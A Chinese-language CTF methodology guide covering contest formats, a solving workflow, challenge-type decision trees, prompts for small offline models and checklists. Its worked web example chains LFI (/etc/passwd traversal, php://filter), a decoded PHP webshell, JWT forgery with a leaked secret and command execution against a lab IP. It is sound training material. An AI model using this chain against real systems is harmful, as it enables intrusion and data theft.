---
category: "方法论"
tags: ["CTF", "解题框架", "竞赛类型", "思维方法"]
difficulty: "入门"
---

# CTF竞赛类型与解题思维框架

## 1. 概述

CTF（Capture The Flag）竞赛是网络安全领域的核心竞技形式。理解不同赛制的特点并建立系统的解题思维框架，是高效解题的前提。本文件重点面向**断网离线场景+小参数模型辅助**这一特定约束条件，提供适配的解题方法论。

### 三大主流赛制

| 赛制 | 特点 | 断网场景适配度 |
|------|------|----------------|
| Jeopardy | 按分类做题，单题独立 | 高，本地知识库可覆盖 |
| Attack-Defense | 实时攻防，需联网 | 低，断网严重受限 |
| 混合赛 | 前段Jeopardy+后段AWD | 中，需预配攻击脚本库 |

### 题目分类体系

CTF题目通常分为六大类：

- **Web**：Web应用安全，包括SQL注入、XSS、CSRF、SSRF、文件上传、反序列化、SSTI等
- **Pwn**：二进制漏洞利用，包括栈溢出、堆溢出、格式化字符串、整数溢出、ROP等
- **Reverse**：逆向工程，包括反编译、反汇编、脱壳、算法逆向等
- **Crypto**：密码学，包括对称加密、非对称加密、哈希碰撞、数学攻击等
- **Misc**：杂项，包括隐写、取证、流量分析、编码转换等
- **Blockchain**：区块链安全，包括智能合约审计、重入攻击、闪电贷等（新兴方向）

## 2. 核心原理

### 2.1 Jeopardy赛制解题五步法

```
[审题] -> [信息收集] -> [漏洞定位] -> [利用开发] -> [Flag提取]
  |           |              |              |              |
 分类确认   端口/服务       PoC构造       Exp编写       格式验证
 分值评估   版本/框架       异常输入       Shell获取      提交确认
 附件分析   目录爆破        Fuzz测试      绕过防护       检查完整性
```

每一步的具体操作：

**第一步：审题（5-10分钟）**
- 阅读题目描述，提取关键词
- 查看题目分类标签（Web/Pwn/Reverse/Crypto/Misc）
- 评估分值（通常低分简单高分难，但注意"水题"）
- 如果有附件，先下载并初步分析文件类型

**第二步：信息收集（10-30分钟）**
- 对目标IP进行端口扫描：`nmap -sV -sC -p- <target>`
- 识别Web框架、CMS及其版本
- 爆破目录和文件：`gobuster dir -u <url> -w <wordlist>`
- 抓取HTTP响应头、Cookie、JS文件进行分析

**第三步：漏洞定位（20-60分钟）**
- 根据服务版本查找已知漏洞（CVE）
- 测试常见注入点（' " \ / ; | & $ \x00）
- 测试文件包含路径（../../etc/passwd）
- 对二进制文件运行checksec和file

**第四步：利用开发（30-120分钟）**
- 构造PoC验证漏洞存在
- 开发完整Exp获取访问权限
- 测试WAF/防护机制的绕过方法

**第五步：Flag提取（10-30分钟）**
- 在目标系统中搜索flag文件
- 验证flag格式（通常为flag{...}）
- 提交flag前检查编码（URL编码/HTML实体）

### 2.2 离线场景下的解题思维模型

在断网环境中，必须建立**预加载-本地推理**双层思维：

**第一层：知识库匹配**
1. 读取题目描述中的关键词（服务名、端口、框架版本）
2. 在本地RAG知识库中检索相关漏洞条目
3. 匹配已知Payload模板
4. 检查本地是否有对应CVE的预存Exp

**第二层：小模型辅助推理**
1. 将知识库检索结果+题目上下文构造Prompt
2. 使用本地小模型（7B-13B参数）进行漏洞推导
3. 人工验证模型输出的代码/Payload
4. 将成功的Payload回写到知识库

### 2.3 题目分类识别决策树

```
题目给出IP:Port
  ├── Web服务(80/443/8080/3000/5000)
  │     ├── 有登录框 → SQL注入/弱口令/会话伪造/OAuth漏洞
  │     ├── 有文件上传 → 文件上传漏洞/文件包含/条件竞争
  │     ├── 有搜索功能 → XSS/SQL注入/SSTI/命令注入
  │     ├── 有API端点 → IDOR/SSRF/JWT攻击/GraphQL注入
  │     ├── 有富文本编辑 → XSS/CSRF/HTML注入
  │     ├── 有WebSocket → WebSocket劫持/CSWSH
  │     └── 纯静态页面 → 源码审计/JS逆向/隐藏接口
  ├── 非Web服务
  │     ├── 22(SSH) → 弱口令/密钥泄露/SSH隧道
  │     ├── 21(FTP) → 匿名登录/缓冲区溢出/路径遍历
  │     ├── 3306(MySQL) → 弱口令/UDF提权/LOAD DATA
  │     ├── 6379(Redis) → 未授权访问/主从复制RCE
  │     ├── 27017(MongoDB) → 未授权访问/NoSQL注入
  │     └── 未知端口 → nc探测+二进制逆向/协议分析
  ├── 纯文件题目
  │     ├── ELF/EXE → 逆向工程/Pwn
  │     ├── .pyc/.class → 反编译
  │     ├── .pcap/.pcapng → 流量分析
  │     ├── 图片/音频 → 隐写分析
  │     └── 加密文件 → 密码破解/格式分析
  └── 混合型 → 同时涉及多个分类
```

## 3. 关键技巧/检测方法

### 3.1 快速题型分类Prompt（给小模型用）

```
你是一个CTF解题助手。根据以下题目信息，判断题目类型、可能考点和解题路径。

题目信息：{题目描述}
端口信息：{端口扫描结果}
附件文件类型：{文件类型}
题目分值：{分值}

请按以下格式输出：
1. 题目分类：[Web/Pwn/Reverse/Crypto/Misc]
2. 细分考点：[具体漏洞类型，列出Top3可能]
3. 解题路径：[3-5步操作流程，每步标明工具和命令]
4. 需要使用的工具：[工具列表，按优先级排序]
5. 关键命令：[命令模板，可直接复制执行]
6. 注意要点：[任何需要特别注意的地方]
```

### 3.2 离线环境下的题目信息记录模板

```bash
#!/bin/bash
# init_challenge.sh - 初始化题目笔记

CHALLENGE_NAME="$1"
CHALLENGE_IP="$2"
CHALLENGE_PORT="$3"
CATEGORY="${4:-unknown}"

NOTES_DIR="./notes/${CHALLENGE_NAME}"
mkdir -p "$NOTES_DIR"

cat > "${NOTES_DIR}/README.md" << EOF
# ${CHALLENGE_NAME}

## 基本信息
- 分类: ${CATEGORY}
- 目标: ${CHALLENGE_IP}:${CHALLENGE_PORT}
- 开始时间: $(date)

## 信息收集结果
\`\`\`
待填充
\`\`\`

## 尝试记录
| 时间 | 尝试内容 | 结果 |
|------|----------|------|
| | | |

## Flag
\`\`\`
待发现
\`\`\`
EOF

# 初始扫描
echo "[*] 开始初始扫描..."
nmap -sV -sC -p "${CHALLENGE_PORT}" "${CHALLENGE_IP}" \
    -oN "${NOTES_DIR}/nmap_initial.txt" 2>&1

echo "[+] 题目笔记已初始化: ${NOTES_DIR}/README.md"
```

### 3.3 解题卡住时的自检清单

解题遇到瓶颈时，按以下清单逐项排查：

**信息收集层面：**
1. 是否对目标做了全端口扫描（不仅是题目给的端口）？
2. 是否识别了所有服务的具体版本号？
3. 是否尝试了UDP端口扫描？
4. 是否抓取了完整的HTTP请求和响应？
5. 是否检查了HTML源码中的注释和隐藏字段？
6. 是否下载并分析了所有JS文件？

**思路层面：**
7. 题目类型判断是否正确？（尤其注意Web和Misc的交叉）
8. 是否遗漏了附件中的线索？（字符串、文件名、注释、元数据）
9. 是否考虑了题目可能有多步利用链？
10. 是否需要换个完全不同的攻击向量？

**工具层面：**
11. Payload是否被WAF拦截？（检查响应差异）
12. 是否尝试了编码/混淆版本的Payload？
13. 本地Payload库是否足够新？

**模型辅助层面：**
14. 给模型的Prompt是否包含了足够的上下文？
15. 是否尝试了不同的Prompt表述方式？
16. 模型输出的代码是否经过了语法验证？

### 3.4 各分类的通用checklist

**Web题目自检清单：**
```bash
# Web Checklist
[ ] robots.txt / sitemap.xml
[ ] .git/ 泄露
[ ] .DS_Store 文件
[ ] .svn/ 目录
[ ] 备份文件 (.bak, .swp, ~, .orig)
[ ] 源代码泄露 (www.zip, www.tar.gz)
[ ] HTTP method 篡改 (PUT, DELETE, PATCH)
[ ] HTTP Header 注入 (X-Forwarded-For, Host, Referer)
[ ] 路径穿越 (../../../etc/passwd)
[ ] 命令注入常见参数位置
[ ] SQL注入所有输入点
[ ] SSTI 模板注入点
[ ] 反序列化参数
[ ] JWT Token 分析
```

**Pwn题目自检清单：**
```bash
# Pwn Checklist
[ ] file 确定二进制类型
[ ] checksec 检查保护机制
[ ] strings 搜索有用字符串
[ ] objdump/readelf 分析段信息
[ ] ltrace 跟踪库函数调用
[ ] strace 跟踪系统调用
[ ] 输入长度限制分析
[ ] 是否存在格式化字符串漏洞
[ ] 是否存在整数溢出
[ ] 是否存在UAF/条件竞争
```

## 4. 常见误区与注意事项

### 4.1 赛制认知误区

| 误区 | 正解 |
|------|------|
| "所有题目都能靠工具自动解决" | 工具是辅助，核心在于理解和适配 |
| "小模型能力不足以辅助解题" | 7B模型在特定领域（如识别漏洞类型）表现足够好 |
| "断网就没法做题" | 充分预置的本地知识库可以覆盖85%+的Jeopardy题目 |
| "先做高分的难题" | 应先做低分简单题建立信心和节奏，高难度题目放到中后期集中精力 |
| "一题做不出来就死磕" | 设定时间上限（如60分钟），超时则切换题目 |
| "分类标签一定准确" | 有时出题人会故意误导，需要实际分析后重新判断 |
| "有附件的题目不需要扫描目标" | Web题目也可能同时给附件和服务地址 |
| "低分题目一定简单" | 不一定，有时低分题是"深坑" |

### 4.2 思维陷阱

- **确认偏误（Confirmation Bias）**：第一次判断了题目类型后就忽略其他可能性。应定期回到初始信息重新分析。应对策略：每30分钟回顾一次基础信息。
- **锚定效应（Anchoring Effect）**：过度依赖第一个发现的"线索"，即使后续无法利用也不愿放弃。应对策略：使用"平行假设法"同时保持2-3个不同解题方向。
- **工具依赖（Tool Dependency）**：过度依赖自动化工具而忽略手动验证。每个工具输出都应人工确认，特别是sqlmap等工具的检测结果可能存在误报。
- **过早放弃（Premature Abandonment）**：某类题目（如Pwn）看起来难就跳过。有时简单溢出题反而在Pwn分类的高分区。应对策略：阅读题目描述而非只看分类。
- **隧道视野（Tunnel Vision）**：只关注一个漏洞类型而忽视可能的攻击链。应对策略：列出所有可能的攻击面后再逐一排除。

### 4.3 断网环境特殊注意事项

- **时间感知**：断网环境下无法自动同步时间，需手动记录开始/结束时间，建议使用物理计时器
- **依赖完整性**：Python/Node/npm包必须预先离线下载完整依赖树，一个间接依赖缺失就可能导致脚本无法运行
- **Docker镜像**：所有可能用到的Docker镜像必须提前pull并保存为tar，注意包括基础镜像
- **搜索引擎替代**：本地Elasticsearch/Meilisearch必须提前索引好CTF资料（CTFtime writeup、漏洞库、PayloadAllTheThings等）
- **通信限制**：无法与队友在线协作，需提前规划好局域网通信方式（如内网聊天服务、共享文件夹）

## 5. 实战示例

### 示例1：Jeopardy单题快速解题完整流程

**场景**：收到一个Web题目，目标 `10.10.10.5:8080`，附件包含源码zip包。分值为300分（中等难度）。

```bash
# ===== 审题阶段 =====
# 题目描述："一个简单的博客系统，使用了流行的PHP框架"
# 附件的文件名：blog_source.zip
# 初步判断：Web-PHP代码审计

# ===== 信息收集阶段 =====
# Step 1: 快速扫描
nmap -sV -sC -p 8080 10.10.10.5 -oN scan_result.txt
# 输出: 8080/tcp open http Apache httpd 2.4.49
#       http-title: Simple Blog

# Step 2: 目录爆破
gobuster dir -u http://10.10.10.5:8080 \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,txt,html,bak -o gobuster_result.txt
# 发现: /admin/, /api/, /upload/, /config.php.bak

# Step 3: 获取配置文件
curl http://10.10.10.5:8080/config.php.bak -o config.php
cat config.php
# 发现数据库配置和密钥

# ===== 漏洞定位阶段 =====
# Step 4: 源码审计 - 解压并分析
unzip blog_source.zip -d source/
cd source/

# Step 5: 使用模型辅助分析（断网场景用小参数模型）
# Prompt: "审计以下PHP代码，重点检查include/require/file_get_contents
#          函数中的用户可控参数，以及SQL查询中的拼接问题"
# 模型输出指出 /api/fetch.php 中存在：
# include($_GET['template'] . '.php')

# ===== 利用开发阶段 =====
# Step 6: 验证LFI漏洞
curl "http://10.10.10.5:8080/api/fetch.php?template=../../../../../etc/passwd%00"
# 成功读取/etc/passwd

# Step 7: 使用php://filter读取源码
curl "http://10.10.10.5:8080/api/fetch.php?template=php://filter/convert.base64-encode/resource=../admin/dashboard"
# 获取admin/dashboard.php的base64编码内容

# Step 8: 发现admin/dashboard.php中有命令执行点
echo "PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7" | base64 -d
# 输出: <?php system($_GET['cmd']);

# Step 9: 需要管理员权限才能访问dashboard.php
# 分析config.php.bak中泄露的JWT密钥
# 伪造admin JWT令牌
python3 << 'EOF'
import jwt
import time

secret = "blog_secret_key_2023"  # 从config.php.bak中获取
payload = {
    "user": "admin",
    "role": "administrator",
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600
}
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Admin Token: {token}")
EOF

# ===== Flag提取阶段 =====
# Step 10: 使用管理员token+命令注入获取flag
TOKEN="eyJ..."
curl -H "Cookie: token=${TOKEN}" \
    "http://10.10.10.5:8080/admin/dashboard.php?cmd=cat+/flag"

# Flag: flag{LFI_2_RCE_via_JWT_forgery_2023}

# ===== 解题笔记 =====
# 将完整过程记录到笔记模板中，便于赛后复盘
```

### 示例2：混用知识库+小模型解题（Crypto题目）

**场景**：收到一个Crypto题目，只有加密脚本和密文，没有网络服务。提供了一个Python加密脚本和output.txt。

```
Step 1: 分析加密脚本
  脚本使用了RSA加密，但有以下异常：
  - n很小（256位），暗示可分解
  - 加密指数e=3，经典的"小指数攻击"场景
  - 明文被填充了固定格式

Step 2: 在本地知识库中搜索
  关键词: "RSA small e attack" "Coppersmith" "Hastad broadcast"
  检索结果: 匹配到"低加密指数广播攻击(Hastad's Broadcast Attack)"
  前提条件: 相同的明文被至少e个不同模数加密

Step 3: 检查是否存在多个密文
  发现output.txt中确实有3组(n, c)对！
  这就是典型的Hastad广播攻击场景

Step 4: 知识库中有现成的Exp模板，但需要适配参数
  使用小模型辅助修改参数：
  Prompt: "以下是Hastad广播攻击的Exp模板，请帮我修改参数，
  适配n1=..., n2=..., n3=..., c1=..., c2=..., c3=..."

Step 5: 运行Exp获取明文
  python3 solve.py
  # 输出: flag{crt_hastad_broadcast_attack_success}

这个例子展示了：
1. 利用本地知识库快速匹配攻击类型（无需联网搜索）
2. 小模型辅助修改Exp模板适配具体参数
3. 不需要大模型也能完成分析推理
```

### 示例3：思维框架在AWD（混合赛）中的应用

**场景**：混合赛第二阶段是AWD，需要攻防同时进行。

```
AWD情境下的解题思维调整：

1. 攻防优先级矩阵：
   - 高优：自己的服务被攻破（需要立即修补）
   - 中优：发现新的攻击方法（先自己修再用来攻击别人）
   - 低优：刷新被攻击服务的功能

2. 时间分配建议（每轮30分钟）：
   - 前5分钟：检查自己的服务运行状态
   - 5-15分钟：修补已知漏洞
   - 15-25分钟：编写/使用攻击脚本
   - 25-30分钟：提交flag+修复新发现问题

3. 关键策略：
   - 先守后攻 - 确保自己的flag不被偷
   - 差异化修补 - 不在第一时间修补所有漏洞（留时间窗口攻击他人）
   - 批量自动化 - 编写批量攻击和批量提交脚本
```

## 6. 相关知识点

- [02-离线环境搭建与工具预装策略](./02-离线环境搭建与工具预装策略.md) - 断网环境的前置准备
- [03-信息收集与侦察方法论](./03-信息收集与侦察方法论.md) - 解题第一步
- [04-给AI小模型的提示词工程](./04-给AI小模型的提示词工程.md) - 如何写出有效的Prompt
- [05-Linux命令行速查与高级技巧](./05-Linux命令行速查与高级技巧.md) - 提高操作效率
- [07-调试与故障排除方法论](./07-调试与故障排除方法论.md) - 解决遇到的障碍
- [09-时间管理与题目优先级策略](./09-时间管理与题目优先级策略.md) - 比赛中的时间分配
